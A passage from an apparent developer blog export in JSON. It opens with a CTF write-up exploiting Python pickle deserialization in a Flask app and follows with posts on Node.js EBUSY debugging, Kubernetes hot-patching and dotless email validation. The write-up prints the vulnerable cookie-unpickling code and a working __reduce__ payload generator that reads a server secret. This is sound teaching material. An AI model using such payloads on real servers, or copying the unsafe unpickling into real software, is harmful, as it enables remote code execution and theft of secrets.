position: absolute; top: {random.random()*100}%; left: {random.random()*100}%;\\">{item}</div>\' for item in items)\\n \\n@app.route(\'/add\', methods=[\'POST\'])\\ndef add():\\n    contents = request.cookies.get(\'contents\')\\n    if contents: items = pickle.loads(base64.b64decode(contents))\\n    else: items = []\\n    items.append(request.form[\'item\'])\\n    response = make_response(redirect(\'/\'))\\n    response.set_cookie(\'contents\', base64.b64encode(pickle.dumps(items)))\\n    return response\\n```\\n\\nThe root route basically retrieves the client cookie named contents and returns  hardcoded HTML back to the client with a list of items (or an empty list if there are no items).\\n\\nThe `/add` route is responsible for appending a new item to the list of items and setting the cookie.\\nWhat is common to both methods/routes is that they both decode the `base64` cookie and load/dump using the `pickle` library.\\n\\nI\u2019ve worked with the [`pickle`](https://docs.python.org/3/library/pickle.html) library before but not to the extent that I understood completely how it worked. So I turned to the official documentation to review how it performs its de/serialization.\\n\\n## `pickle` Research and Breakthrough\\n\\nThe first thing I noticed when I accessed the pickle documentation was the following big red warning sign:\\n\\n> The `pickle` module is not secure. Only un`pickle` data you trust.\\n> It is possible to construct malicious pickle data which will **execute arbitrary code during unpickling**. Never unpickle data that could have come from an untrusted source, or that could have been tampered with.\\n\\nSounds like this is where we should focus on. If we review the Flask server code, the logic inside the method serving the root path (`def jar`) `base64` decodes the cookie and loads it using the `pickle` module. This means that if we can somehow tamper with the cookie, we could potentially generate a malicious payload to break the app and capture the flag.\\nWe can access the cookie from the browser using JavaScript:\\n\\n```javascript\\ndocument.cookie\\n\\"contents=gASVJgAAAAAAAABdlCiMBWtvYmJplIwFdGVzdDKUjA5yZWFsbHkgdWdseSB1aZRlLg==\\"\\n\\ndocument.cookie.split(\\"=\\")[1]\\n \\n\\"gASVJgAAAAAAAABdlCiMBWtvYmJplIwFdGVzdDKUjA5yZWFsbHkgdWdseSB1aZRlLg==\\"\\n```\\n\\nSince we know that this string representing the cookie is `base64` (not only because of the Python code we reviewed but also because it has the famous \u2018==\u2018 suffix), we can decode it and understand it\u2019s structure.\\nI saved the string into a file called `cookie` and proceeded to `base64` decoded it and pipe it into another file called `cookie_decoded`:\\n\\n```bash\\necho \\"gASVJgAAAAAAAABdlCiMBWtvYmJplIwFdGVzdDKUjA5yZWFsbHkgdWdseSB1aZRlLg==\\" > cookie\\n \\nbase64 -d cookie > cookie_decoded\\n```\\n\\nWhen printing the contents of `cookie_decoded`, the output had the text I\u2019ve added to the input field surrounded by some unrecognizable characters:\\n\\n```bash\\ncat cookie_decoded\\n \\n\ufffd\ufffd&]\ufffd(\ufffdkobbi\ufffd\ufffdtest2\ufffd\ufffdreally ugly ui\ufffde.%\\n```\\n\\nSo it seems that there\u2019s another layer of decoding to the file. Upon further research, I found a [set of tools called `pickletools`](https://docs.python.org/3/library/pickletools.html) that were able to disassemble a pickle file, which is what I believed I had in the string representation of `cookie_decoded`.\\nI ran the following command to understand how to work with `pickletools`:\\n\\n```bash\\npython3 -m pickletools\\nusage: pickletools.py [-h] [-o OUTPUT] [-m] [-l INDENTLEVEL] [-a] [-p PREAMBLE] [-t] [-v] [pickle_file ...]\\n \\ndisassemble one or more pickle files\\n \\npositional arguments:\\n  pickle_file           the pickle file\\n \\n# ...\\n```\\n\\nSo it looks like it accepts a file as a positional argument. Therefore I ran:\\n\\n```bash\\npython3 -m pickletools cookie_decoded\\n \\n    0: \\\\x80 PROTO      4\\n    2: \\\\x95 FRAME      38\\n   11: ]    EMPTY_LIST\\n   12: \\\\x94 MEMOIZE    (as 0)\\n   13: (    MARK\\n   14: \\\\x8c     SHORT_BINUNICODE \'kobbi\'\\n   21: \\\\x94     MEMOIZE    (as 1)\\n   22: \\\\x8c     SHORT_BINUNICODE \'test2\'\\n   29: \\\\x94     MEMOIZE    (as 2)\\n   30: \\\\x8c     SHORT_BINUNICODE \'really ugly ui\'\\n   46: \\\\x94     MEMOIZE    (as 3)\\n   47: e        APPENDS    (MARK at 13)\\n   48: .    STOP\\nhighest protocol among opcodes = 4\\n```\\n\\nTo translate the output, I needed to review the [pickletools source code](https://github.com/python/cpython/blob/master/Lib/pickletools.py). The most important parts of the source file are in the comments and describe the data structure of the `pickle` and are included below:\\n\\n> \\"A pickle\\" is a program for a virtual pickle machine (PM, but more accurately called an unpickling machine).  It\'s a sequence of opcodes, interpreted by the PM, building an arbitrarily complex Python object.\\n\\n> Opcodes are executed once each, from first to last, until a STOP opcode is reached.\\n\\n> The PM has two data areas, \\"the stack\\" and \\"the memo\\".\\n\\n> Many opcodes push Python objects onto the stack\\n\\n> Other opcodes take Python objects off the stack.  The result of unpickling is whatever object is left on the stack when the final STOP opcode is executed.\\n\\n> The memo is simply an array of objects, or it can be implemented as a dict mapping little integers to objects.  The memo serves as the PM\'s \\"long term memory\\", and the little integers indexing the memo are akin to variable names.  Some opcodes pop a stack object into the memo at a given index, and others push a memo object at a given index onto the stack again.\\n\\n> opcodes description\\n> `PROTO` - A way for a pickle to identify its protocol.\\n> `FRAME` - The unpickler may use this opcode to safely prefetch data from its underlying stream.\\n> `EMPTY_LIST` - creates a list.\\n> `MARK` - Push markobject onto the stack.\\n> `MEMOIZE` - Store the stack top into the memo.  The stack is not popped. The index of the memo location to write is the number of elements currently present in the memo.\\n> `SHORT_BINUNICODE` - Push a Python Unicode string object.\\n> `APPENDS` - Extend a list by a slice of stack objects\\n> `STOP` - Stop the unpickling machine.\\n\\nAfter reading the documentation in detail, we are able to decypher what the output instructions of the assembly behind the `pickle` actually mean:\\n\\n1. The protocol used by this pickle is 4.\\n1. The size of the frame coming from the stream (represented by the bytes from the `cookie_decoded` file) is 38 bytes long.\\n1. Generate and push a new empty list to the stack.\\n1. Store the stack top into the memory at index 0.\\n1. Push the `markobject` (a special object that marks the current instruction similar to the CIR register in CPU control unit) onto the stack.\\n1. Push the string \u2018kobbi\u2019 into the onto the stack.\\n1. Store the stack top into the memo at index 1.\\n1. Repeat instruction 6 and 7 for \u2018test2\u2019 and \u2018really ugly ui\u2019 strings with indices 2,3 respectively.\\n1. Extend the list holding the strings.\\n1. Stop the PM.\\n\\nGreat, so now that we have the instructions, what\u2019s next? Well, we need to figure out how to generate a cookie string that will include a command to read the environmental variable where the cookie value is held and when unpickled, will spit out the flag.\\n\\n## Generating the Cookie to Expose the Flag\\n\\nNow that we have a greater understanding what the pickle assembly looks like, the next step would be to find a way to generate a payload that when unpickled, would expose the flag we need to complete the assignment.\\nIf we review the source code of the Flask server, we can see that the flag is held in an environmental variable:\\n\\n```python\\nflag = os.environ.get(\'FLAG\', \'actf{FAKE_FLAG}\')\\n```\\n\\nSo in whatever payload we generate, we would need to run a system call to read the environmental variable, probably something like this:\\n\\n```python\\nos.getenv(\'FLAG\')\\n```\\n\\nThat\u2019s the easy part. But how do we generate the payload and insert this command within the bytecode of the cookie to be unpickled?\\n\\nAfter some research, I found [the following article describing how we can use the `reduce` method to append additional commands to the bytecode payload](https://davidhamann.de/2020/04/05/exploiting-python-pickle/). The appended command will be used for retrieving the `FLAG` environmental variable.\\nI used the article to write a script to generate the bytecode payload, modifying it to suit my needs (the author needed to run some commands and get back a reverse shell, here we\u2019re only interested in getting the `FLAG` environmental variable). This is the script called `payloadgen.py`:\\n\\n```python\\nimport pickle\\nimport base64\\nimport os\\n \\nclass PayloadGen(object):\\n   def __reduce__(self):\\n      return (os.getenv, (\'FLAG\',))\\n \\nif __name__ == \'__main__\':\\n   dmp = pickle.dumps(PayloadGen())\\n   print(base64.urlsafe_b64encode(dmp))\\n```\\n\\nI\u2019m using `urlsafe_b64encode` here because I want to ensure that the generated encoded payload is URL safe. Also, the extra comma in `(\'FLAG\',)` is there because the second item of the tuple returned by `reduce` must be a `tuple` as well.\\nI then ran the script:\\n\\n```bash\\npython3 payloadgen.py\\nb\'gASVHAAAAAAAAACMAm9zlIwGZ2V0ZW52lJOUjARGTEFHlIWUUpQu\'\\n```\\n\\nNice! If we take the value \u2018gASVHAAAAAAAAACMAm9zlIwGZ2V0ZW52lJOUjARGTEFHlIWUUpQu\u2018 and set the cookie to it and refresh the page, we get a scrambled set of letters which is likely our flag!\\n\\n![scrambled](https://tilsupport.files.wordpress.com/2021/04/image-5.png)\\n\\nThe last piece of the puzzle is to figure out the correct order of the flag and reassemble it.\\n\\n## Reassembling the Flag\\n\\nIf we look at the image above, we can see that the letters of the flag are displayed on the site in an unordered manner. When refreshing the page, the letters will be shuffled to a different order. By reviewing the HTML returned by the root path, we see that the method returns a random positioning for each `div` item:\\n\\n```css\\ntop: {random.random()*100}%;\\nleft: {random.random()*100}%;\\n```\\n\\n```python\\nreturn \'<form method=\\"post\\" action=\\"/add\\" style=\\"text-align: center; width: 100%\\"><input type=\\"text\\" name=\\"item\\" placeholder=\\"Item\\"><button>Add Item</button><img style=\\"width: 100%; height: 100%\\" src=\\"/pickle.jpg\\">\' + \\\\\\n        \'\'.join(f\'<div style=\\"background-color: white; font-size: 3em; position: absolute; top: {random.random()*100}%; left: {random.random()*100}%;\\">{item}</div>\' for item in items)\\n```\\n\\nBut, what we notice here is that the `for` loop (`for item in items`) iteration is actually done in an ordered manner, which should simplify figuring out how to reassemble the flag text. So I reviewed the HTML of the page and found that the items are, as expected, positioned in an ordered manner (all Angstrom CTF flags have the following standard structure: `actf{}`):\\n\\n![scramble-2](https://tilsupport.files.wordpress.com/2021/04/image-6.png)\\n\\nSo we could just manually take each `div` value and construct the flag. But the more elegant way would be to use some JavaScript to construct the flag:\\n\\n```javascript\\nvar letters = document.getElementByTagName(\\"div\\")\\nvar flag = \\"\\"\\n \\nfor (var i = 0; i < letters.length; i++){\\n   flag += letters[i].innerText;\\n}\\n```\\n\\nWhich outputs the flag:\\n\\n```javascript\\nflag\\n\\nactf{you_got_yourself_out_of_a_pickle}\\n```"},{"id":"catch-ebusy-on-nodejs","metadata":{"permalink":"/blog/catch-ebusy-on-nodejs","source":"@site/blog/catch-ebusy-on-nodejs.md","title":"How To Catch EBUSY Event on Windows using NodeJS","description":"Introduction","date":"2025-02-07T09:07:28.000Z","tags":[{"inline":false,"label":"Nodejs","permalink":"/blog/tags/nodejs"},{"inline":false,"label":"Windows","permalink":"/blog/tags/windows"},{"inline":false,"label":"Web-dev","permalink":"/blog/tags/web-dev"},{"inline":false,"label":"Debugging","permalink":"/blog/tags/debugging"}],"readingTime":5.885,"hasTruncateMarker":true,"authors":[{"name":"Kobbi Gal","title":"I like to pick things apart and see how they work inside","url":"https://github.com/kbbgl","imageURL":"https://avatars.githubusercontent.com/u/14372649","key":"kbbgl","page":null}],"frontMatter":{"slug":"catch-ebusy-on-nodejs","title":"How To Catch EBUSY Event on Windows using NodeJS","authors":["kbbgl"],"tags":["nodejs","windows","web-dev","debugging"]},"unlisted":false,"prevItem":{"title":"Angstrom CTF2021 | Exploiting Python Pickle in Flask Web\xa0App","permalink":"/blog/angstrom-ctf2021-exploiting-python-pickle-in-flask"},"nextItem":{"title":"Debugging NodeJS Microservice with Shared Storage on\xa0Kubernetes","permalink":"/blog/debugging-nodejs-microservice-with-shared-storage-on-kubernetes"}},"content":"## Introduction\\n\\nDuring a debugging session of one of our NodeJS microservices misbehaving on a Windows Server 2019 instances, I opened the microservice log to begin investigating the faulty behavior.\\n\\n\x3c!-- truncate --\x3e\\n\\nBut when I scrolled down to the timestamp where I was supposed to start investigating, I found out that the log was full of the following errors thrown by an attempt to read the microservice log file:\\n\\n```text\\nError: EBUSY: resource busy or locked, lstat %PROGRAMDATA%/microservice_b/mb.log\\n```\\n\\nFollowed by a termination of the microservice logging. It was visible also that the microservice was in some unstable state as it\'s CPU was on 0% and it\'s memory working set was fixed and not changing.\\n\\nAfter restarting the microservice (a NodeJS process wrapped in a Windows Service), the serverside functionality of the microservice resumed.\\n\\nSince this microservice was critical to the functionality of the application, I needed to do 2 things, in this order:\\n\\n- Ensure that there\'s no downtime for the microservice.\\n- Investigate the root cause of the `EBUSY` error.\\n\\n## Microservice High Availability\\n\\nHigh Availability is a concept that is synonymous with the microservice architecture. In a production-grade, enterprise environment, you want to have fault tolerance in case one of the microservices stops serving it\'s requests\' path (as in the case I investigated here).\\n\\nThere are different approaches to fault tolerance, the most popular one is using replicas of the same microservices to listen on the same requests. For example, in the architecture I was working with, the Angular frontend application was sending requests to the NodeJS/Express servers who were talking between them in Produces/Consumer fashion using a RabbitMQ message broker. Each microservice (and its instances) was bound to one queue in an exchange.\\n\\n![arch](./res/arch.jpeg)\\n\\nThe specific microservice that was malfunctioning had only one instance configured (Instance 1 of Microservice B in the diagram above). In order to provide High Availability in this case, all I needed to do was to find out how to increase the number of instances of a microservice.\\n\\nSince the NodeJS microservices were deployed on a Windows instance and not in the newer generation Linux-cloud native instance which runs atop a Kubernetes cluster (where I could just run `kubectl scale deployment microservice_b --replicas=3`), I needed to check the configuration database (hosted as a Zookeeper instance) and find where we can configure the number of instance per microservice.\\n\\nAfter a while of searching our knowledgebase (why are they always so messy and it\'s so hard to find anything in them?!?!), I found the z-node path where this configuation was held. I sent the following command to set the number of replicas to 3:\\n\\n```bash\\nbin/zkCli.bat -server 127.0.0.1:2181 set /config/microservice_b/clusterNodes 3\\n```\\n\\nFirst task was done. We now had 3 microservices and had High Availability for this critical service path. As you may recall, the next step was the investigation of the EBUSY event and mitigation of it.\\n\\n## Investigating `EBUSY` Event\\n\\nUntil this point, I\'ve been working on debugging NodeJS for about 1 year and mostly in a Windows environment. I have seen and debugged different NodeJS errors, such as filesystem-related `EACCES`, `ENOENT`, `EMFILE` and network-related errors `EADDRINUSE`, `ECONNRESET`, `ECONNREFUSED`, `ECONNABORTED` . But I\'ve never seen `EBUSY` before.\\n\\nFirst step was to see what the [official NodeJS documentation for error messages](https://nodejs.org/dist./v6.3.0/docs/api/all.html) provided. Not much elaboration from the site unfortunately:\\n\\n> EBUSY | Indicates that a device or resource is busy.\\n\\nPer my understanding, this issue was related to the filesystem mutex/lock.\\n\\nI decided that the most efficient way to understand this error code was to review the NodeJS source code since, conveniently enough, is open-source.\\n\\nI cloned the Node JS repo:\\n\\n```bash\\ngit clone https://github.com/nodejs/node.git\\n```\\n\\nTook some time download and extract all of it.\\n\\nI then searched through the source code and found the error code in 21 different files (filtering out all the test-related code):\\n\\n```bash\\ngrep -rnw \\"EBUSY\\" node | cut -d\\":\\" -f1 | grep -v test | uniq | wc -l\\n      21\\n```\\n\\nAfter reviewing some files, I landed on `deps/uv/docs/src/loop.rst` where I found some document string of the method `Loop::uv_loop_close`:\\n\\n```rst\\n.. c:function:: int uv_loop_close(uv_loop_t* loop)\\n\\n    Releases all internal loop resources. Call this function only when the loop\\n    has finished executing and all open handles and requests have been closed,\\n    or it will return UV_EBUSY. After this function returns, the user can free\\n    the memory allocated for the loop.\\n```\\n\\nI found it ironic how the source code is so much more elaborate than the official/external NodeJS documentation.\\n\\nAlso, I learned that .rst extension is a markup language format called [`reStructuredText` that is both human-readable and processable by Python `docutils`](https://en.wikipedia.org/wiki/ReStructuredText).\\n\\nGoing back to the task at hand, the method docstring was helpful in strengthening my educated guess that this issue is filesystem-related. It also provided information about the scenario when this error might occur: after a [NodeJS Event Loop](https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick/#:~:text=What%20is%20the%20Event%20Loop,the%20system%20kernel%20whenever%20possible.&text=js%20so%20that%20the%20appropriate,queue%20to%20eventually%20be%20executed.) has terminated and all open file handles I/O finished.\\n\\nI decided to focus on the latter detail (file handle state) as I have some familiarity with the [Windows SysInternals binary called `handle.exe`](https://docs.microsoft.com/en-us/sysinternals/downloads/handle). It gives us access to information about which process has open file handlers to a specific file.\\n\\nI need a way to fuse this Windows executable with the NodeJS code to catch the `EBUSY` event.\\n\\n## Using Handle Binary in Microservice\\n\\nI wrote a module called `checkFileHandler.js` which has two functions:\\n\\n- `executeHandle` will execute the `handle.exe` binary.\\n\\n- `getCmdArguments` will get the command-line arguments of the processes that handle captured using PowerShell.\\n\\n```javascript\\nvar exec = require(\'child_process\').execFile;\\nconst handleExecutablePath = \\"./handle64.exe\\"\\nconst PID_REGEX = /pid: (\\\\d{1,5})/mg;\\n\\nexecuteHandle = (filename) => {\\n\\n exec(handleExecutablePath, [filename], (err, data) => {\\n \\n  if(err && err.signal == null){\\n   logger.info(`No matching handles for \'${filename}\'`);\\n  } else {\\n   logger.error(`Couldn\'t run handler: ${JSON.stringify(err, null, 3)}`);\\n  }\\n  \\n  var output = data.toString();\\n  console.log(output);\\n  var matches = output.match(PID_REGEX);\\n  \\n  if (matches){\\n   \\n   logger.info(`Found ${matches.length} processes`);\\n   matches.forEach(match => {\\n    var pid = match.split(\\":\\")[1].trimLeft();\\n    getCmdArguments(pid); \\n   })\\n  }\\n  \\n  \\n })\\n}\\n\\ngetCmdArguments = (pid) => {\\n \\n var psCommand = `Get-WmiObject -Query \\\\\\"SELECT CommandLine FROM Win32_Process WHERE ProcessID = ${pid}\\\\\\" | Select-Object -ExpandProperty CommandLine`;\\n  \\n exec(\\"powershell.exe \\", psCommand.split(\\" \\"), (err, data) => {\\n  \\n  if(err) throw err;\\n  \\n  if (data) {\\n   logger.info(`PID ${pid} command line arguments: ${data.toString()}`)\\n   // return data.toString();\\n  }\\n    \\n })\\n \\n}\\n\\nmodule.exports = {\\n\\n executeHandle: executeHandle\\n\\n}\\n```\\n\\nI then loaded the module within the microservice application code (don\'t forget to backup the original code in a production environment!):\\n\\n```javascript\\nvar handler = require(\'checkFileHandler\');\\nvar logfile = \\"%PROGRAMDATA%/microservice_b/mb.log\\";\\n\\n\\n# ...\\ngetData()\\n    .then(changeDataFormat)\\n    .then(storeData)\\n    .catch((e) => {\\n        if (e.code == \'EBUSY\') {\\n            handler.executeHandle(logfile);\\n            process.exit(1)\\n        }\\n    })\\n```\\n\\nSo now, whenever getData function calls finish and the NodeJS Event Loop is terminated but the log file is still unaccessible, we\'re going to receive detailed information about which process and its commands are keeping the log file open. Since the process is now stuck, it would be best to just terminate it so that the microservice scheduler can create another clean instance of the NodeJS server.\\n\\nI restarted the microservice for my code to be applied and patiently waited for the situation to arise again."},{"id":"debugging-nodejs-microservice-with-shared-storage-on-kubernetes","metadata":{"permalink":"/blog/debugging-nodejs-microservice-with-shared-storage-on-kubernetes","source":"@site/blog/debugging-nodejs-microservice-with-shared-storage-on-kubernetes.md","title":"Debugging NodeJS Microservice with Shared Storage on\xa0Kubernetes","description":"Fill me up!","date":"2025-02-07T09:07:28.000Z","tags":[{"inline":false,"label":"Containers","permalink":"/blog/tags/containers"},{"inline":false,"label":"Debugging","permalink":"/blog/tags/debugging"},{"inline":false,"label":"Dev","permalink":"/blog/tags/dev"},{"inline":false,"label":"Docker","permalink":"/blog/tags/docker"},{"inline":false,"label":"Droppy","permalink":"/blog/tags/droppy"},{"inline":false,"label":"K8s","permalink":"/blog/tags/k-8-s"},{"inline":false,"label":"Kubernetes","permalink":"/blog/tags/kubernetes"},{"inline":false,"label":"Node","permalink":"/blog/tags/node"},{"inline":false,"label":"Nodejs","permalink":"/blog/tags/nodejs"},{"inline":false,"label":"Web","permalink":"/blog/tags/web"},{"inline":false,"label":"Webapplication","permalink":"/blog/tags/webapplication"},{"inline":false,"label":"Webdevelopment","permalink":"/blog/tags/webdevelopment"}],"readingTime":6.105,"hasTruncateMarker":true,"authors":[{"name":"Kobbi Gal","title":"I like to pick things apart and see how they work inside","url":"https://github.com/kbbgl","imageURL":"https://avatars.githubusercontent.com/u/14372649","key":"kbbgl","page":null}],"frontMatter":{"slug":"debugging-nodejs-microservice-with-shared-storage-on-kubernetes","title":"Debugging NodeJS Microservice with Shared Storage on\xa0Kubernetes","description":"Fill me up!","authors":["kbbgl"],"tags":["containers","debugging","dev","docker","droppy","k8s","kubernetes","node","nodejs","web","webapplication","webdevelopment"]},"unlisted":false,"prevItem":{"title":"How To Catch EBUSY Event on Windows using NodeJS","permalink":"/blog/catch-ebusy-on-nodejs"},"nextItem":{"title":"How To Set Up Dotless Email Validation in Swagger","permalink":"/blog/dotless-email-regex-validation-swagger"}},"content":"![sort-exceeded](https://tilsupport.files.wordpress.com/2021/05/sort_exceeded-1.png)\\n\\n## Introduction\\n\\nOne of our largest customer recently had a problem loading a list of resources from our web application. The problem was a blocker for the customer and required to identify the problem and provide a workaround, if possible. I was assigned the task as I was the SME in this area (NodeJS microservices, infrastructure such as storage, microservice messaging and configuration).\\n\\n\x3c!-- truncate --\x3e\\n\\n## Initial Analysis and Reproduction\\n\\nThe issue was constantly reproducible which always simplifies things. All I needed to do was to restore the MongoDB dump, log in with a certain user and attempt to load the webpage with the list of resources.\\nI restored the MongoDB dump using:\\n\\n```bash\\nmongorestore /path/to/dump\\n```\\n\\nand logged in with the user and accessed the webpage.\\nI saw that the webpage layout loaded just fine but the actual resource tree was missing. I then opened up the Chrome Developer Tools and navigated to the \u2018Network\u2019 tab which allowed me to see the requests sent to the server and find the failing API call. Easily enough, I discovered that the:\\n\\n```bash\\ncurl -X GET $SERVER/api/list\\n```\\n\\nReturned a [500 HTTP response code (Internal Server Error)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/500). This indicates that there must be some uncaught exception thrown from the server side. The only way to understand the problem is to check the server logs and proceed from there.\\n\\n## Reviewing Server Logs\\n\\nAs I had a lot of experience dealing with the specific microservice and storage, I knew the architecture and dependencies pretty well. In short, it\u2019s a NEAM (NodeJS + Express + Angular + MongoDB) stack. The list of resources were stored in a MongoDB collection (let\u2019s call it resources). The DAL (data access layer) interacting with the resources collection was a NodeJS microservice running an Express server. The client generating the API call was running Angular. The microservices were running in Docker containers in a Kubernetes cluster.\\n\\nReviewing the NodeJS microservice logs, I saw the following error:\\n\\n```text\\nExceeded memory limit for $group, but didn\'t allow external sort\\n```\\n\\nResearching this issue, I found that it\u2019s related to the size of the MongoDB query generated. To understand the magnitude of the query, I checked the MongoDB collection size:\\n\\n```javascript\\ndb.resources.count()\\n// 1242731\\n```\\n\\nThis was the largest number of documents I\u2019ve seen in this collection. It seems that the sort aggregation query generated to MongoDB was too large and couldn\u2019t be processed by the server.\\n\\n## Brainstorming Solutions\\n\\nStarting to think about the possible solutions, the first one that came to mind was to run some sort of cleanup scripts to remove MongoDB duplicates. Since I had a tool like that at my disposal, I ran it. But the script removed less than 1% of the documents.\\nThe second solution was also related to decreasing the number of documents. But have the customer review the system and begin purging irrelevant resources from the web app. The customer reviewed their list of resources but could not find any particular resources that could be removed. So it seems that we need to somehow resolve the issue without decreasing the size of the collection.\\nAfter reviewing the NodeJS microservice source code, I found that the query generated by the DAL to MongoDB was the following (simplified version):\\n\\n```javascript\\n// /path/to/resources.dal.js\\ndb.getCollection(\'resources\').aggregate([\\n  { \\n    \\"$group\\": {\\n      \\"ids\\": { \\"$push\\": \\"$_id\\" }\\n    }\\n  }\\n])\\n```\\n\\nSo seems that 1 million documents with this specific query was not going to be processed. I needed to find a way to modify the query to be able to execute successfully.\\nI did some research and found that MongoDB has a `100MB` system limit on blocking sort operation. There was no way to increase this limit. But, there was a way to work around this problem by using the disk as swap space to complement the RAM used by the query. MongoDB creates a temporary directory (`_tmp`) inside the `dbPath` storage location to generate and process the query.\\n\\n## `allowDiskUse` and Changing Source Code\\n\\nThe configuration to use the disk as swap space to increase the MongoDB system limit is quite easy. All we need to do is add the following object to the query:\\n\\n```javascript\\n{allowDiskUse: true}\\n```\\n\\nAdding it to the source code on my test machine, it looked like this:\\n\\n```javascript\\n// /path/to/resources.dal.js\\ndb.getCollection(\'resources\').aggregate([\\n  { \\n    \\"$group\\": {\\n      \\"ids\\": { \\"$push\\": \\"$_id\\" }\\n    }\\n  }\\n], {allowDiskUse: true})\\n```\\n\\nRestarting the service for the changes to take effect, the `GET /api/resources` API call returned a 200. Success!\\nBut, I faced one last problem: the issue is happening in production. How was I going to change the source code on a Docker container if upon recycling (kubectl delete pod $POD_NAME), the source code would be reverted to the original source code packed into the image?\\n\\nAfter a few hours of tinkering around, trying to find an answer to this question, I was able to find a direction that would lead me to the solution implementation.\\nI started by reviewing a few things:\\n\\n- The NodeJS microservice `Dockerfile` \u2013 I found that the `Dockerfile` executed the following command to start the server:\\n\\n ```dockerfile\\n CMD [\\"npm\\", \\"start\\"]\\n ```\\n\\n- The Kubernetes `Deployment` (shortened for brevity) had the same initial execution commands but with additional commands to move around some resources within the container and the shared storage location:\\n\\n ```yaml\\n apiVersion: v1\\n kind: Deployment\\n metadata:\\n name: some-nodejs-service\\n labels:\\n  purpose: backend\\n spec:\\n containers:\\n - name: some-nodejs-service\\n  image: alpine\\n  command: [\\"/bin/bash\\"]\\n  args: [\\"-c\\", \\"|\\", \\"mkdir -p /tmp/other-res;\\", \\"mv /path/to/app/tmp /tmp/other-res&&\\", \\"npm start\\"]\\n volumeMounts:\\n  - mountPath: /opt/storage\\n  name: storage\\n volumes:\\n - name: storage\\n  persistentVolumeClaim:\\n  claimName: storage-claim\\n ```\\n\\nSo my thought was: since I have access to the storage using the web application hosting a [Droppy](https://github.com/silverwind/droppy) mounted as `/opt/storage` on the host machine, could I just add a modified NodeJS module with the fix and replace it before the server initializes?\\nIt was worth a shot.\\nThe first thing I needed to do is to copy the module from the container to the shared storage location. To do this, I ran the following command:\\n\\n```bash\\nkubectl exec some-nodejs-service-dd888bb69-plr6j -- cp /path/to/resources.dal.js /opt/storage/resources.dal.js\\n```\\n\\nI then modified the source code in the `resources.dal.js` module that added the `allowDiskUse: true` configuration.\\nNext step was to add a couple of more commands to the container before the NodeJS service is started. The first command is to rename the module:\\n\\n```bash\\nmv /path/to/resources.dal.js /path/to/resources.dal.js.bak\\n```\\n\\nThe next command is to copy the file from the shared storage (the one with the fix) into the container to replace the original module we renamed in the previous command:\\n\\n```bash\\ncp /opt/storage/resources.dal.js /path/to/resources.dal.js\\n```\\n\\nI modified the Kubernetes `Deployment` using `kubectl edit deployment some-nodejs-service`. The modified Kubernetes container commands looked like this:\\n\\n```yaml\\napiVersion: v1\\nkind: Deployment\\nmetadata:\\n  name: some-nodejs-service\\n  labels:\\n    purpose: backend\\nspec:\\n  containers:\\n  - name: some-nodejs-service\\n    image: alpine\\n    command: [\\"/bin/bash\\"]\\n    args: [\\n  \\"-c\\",\\n  \\"|\\",\\n  \\"mkdir -p /tmp/other-res;\\",\\n  \\"mv /path/to/app/tmp /tmp/other-res&&\\",\\n  \\n  # Added this\\n  \\"mv /path/to/resources.dal.js /path/to/resources.dal.js.bak\\",\\n  # Added this\\n  \\"cp /opt/storage/resources.dal.js /path/to/resources.dal.js\\",\\n  \\"npm start\\"\\n  ]\\n   volumeMounts:\\n    - mountPath: /opt/storage\\n      name: storage\\n  volumes:\\n  - name: storage\\n    persistentVolumeClaim:\\n      claimName: storage-claim\\n```\\n\\nUpon saving the changes, I needed to terminate the Pods for changes to take effect using:\\n\\n```bash\\nkubectl scale deployment some-nodejs-service --replicas 0\\nkubectl scale deployment some-nodejs-service --replicas 1\\n```\\n\\nThis fixed the problem, another satisfied customer escalation was resolved!"},{"id":"dotless-email-regex-validation-swagger","metadata":{"permalink":"/blog/dotless-email-regex-validation-swagger","source":"@site/blog/dotless-email-regex-validation-swagger.md","title":"How To Set Up Dotless Email Validation in Swagger","description":"A detailed explanation what dotless emails are and how to set them up in Swagger.","date":"2025-02-07T09:07:28.000Z","tags":[{"inline":false,"label":"Email","permalink":"/blog/tags/email"},{"inline":false,"label":"Regex","permalink":"/blog/tags/regex"},{"inline":false,"label":"Web-dev","permalink":"/blog/tags/web-dev"},{"inline":false,"label":"Swagger","permalink":"/blog/tags/swagger"}],"readingTime":4.675,"hasTruncateMarker":true,"authors":[{"name":"Kobbi Gal","title":"I like to pick things apart and see how they work inside","url":"https://github.com/kbbgl","imageURL":"https://avatars.githubusercontent.com/u/14372649","key":"kbbgl","page":null}],"frontMatter":{"slug":"dotless-email-regex-validation-swagger","title":"How To Set Up Dotless Email Validation in Swagger","description":"A detailed explanation what dotless emails are and how to set them up in Swagger.","authors":["kbbgl"],"tags":["email","regex","web-dev","swagger"],"image":"./res/swagger-logo.png"},"unlisted":false,"prevItem":{"title":"Debugging NodeJS Microservice with Shared Storage on\xa0Kubernetes","permalink":"/blog/debugging-nodejs-microservice-with-shared-storage-on-kubernetes"},"nextItem":{"title":"Fixing Ubuntu Hibernation","permalink":"/blog/fixing-ubuntu-hibernation"}},"content":"## Introduction\\n\\nOne of our customers recently attempted (for reason unknown to us) to log into our platform using [Okta Single Sign On (SSO)](https://www.okta.com/products/single-sign-on/) and [OpenID-Connect](https://openid.net/connect/) with emails missing a top-level domain (TLD) while they could log in just fine with a standard email address.\\n\\n\x3c!-- truncate --\x3e\\n\\nWhile most of us in the day-to-day use the standard email address format with a top-level domain added, e.g. `user@domain.org`, this customer required to be able to log in with user@domain. Our platform rejected the user and they were unable to log in.\\n\\nMy first question was whether this email address (`user@domain`) was even allowed. If it was, I needed to find why it\'s being rejected.\\n\\n## Email Address Syntax Compliance\\n\\nReaching out to the web to figure out whether the customer\'s request was valid, I was surprised to find that the only necessary parts of an email address are according to [section 2.3.10 of the RFC 2821](https://datatracker.ietf.org/doc/html/rfc2821#section-2.3.10):\\n\\n- A \'local\' part, anything on the left of the @ sign.\\n- A \'domain host\' part, anything on the right of the @ sign.\\n\\nI found that the [Internet Corporation for Assigned Names (ICANN) highly discourages the use of unspecified TLD](https://www.icann.org/en/system/files/files/ua-factsheet-a4-17dec15-en.pdf) and that it [requires a specified record in the apex of the TLD zone in the DNS](https://www.icann.org/en/announcements/details/new-gtld-dotless-domain-names-prohibited-30-8-2013-en). Aside from that, it is compliant with [RFC 5322](https://datatracker.ietf.org/doc/html/rfc5322#section-3).\\n\\nSo the customer\'s request is a valid one! This meant that I needed to perform 2 changes in two different areas:\\n\\n- Modify the name server configuration on the customer\'s Windows instance.\\n\\n- Find where within our code there\'s validation for the email address and modify it.\\n\\n## Adding TLD 